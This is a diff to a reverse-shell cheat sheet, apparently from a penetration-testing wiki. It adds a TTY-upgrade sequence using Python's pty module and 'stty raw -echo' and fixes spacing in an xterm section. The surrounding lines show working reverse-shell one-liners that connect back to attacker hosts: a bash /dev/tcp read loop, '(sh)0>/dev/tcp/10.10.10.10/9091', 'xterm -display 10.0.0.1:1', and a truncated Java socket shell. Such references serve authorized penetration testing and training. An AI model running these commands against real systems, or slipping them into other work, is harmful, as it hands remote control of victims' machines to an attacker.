@@ -18,6 +18,10 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 (sh)0>/dev/tcp/10.10.10.10/9091
 #after getting the previous shell, to get the output execute
 exec >&0
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo; fg 
 ```
 
 Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
@@ -270,13 +274,13 @@ BEGIN {
 
 ## Xterm
 
-One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
-To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
 
 ```bash
 Xnest :1
@@ -308,4 +312,3 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 {% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
-
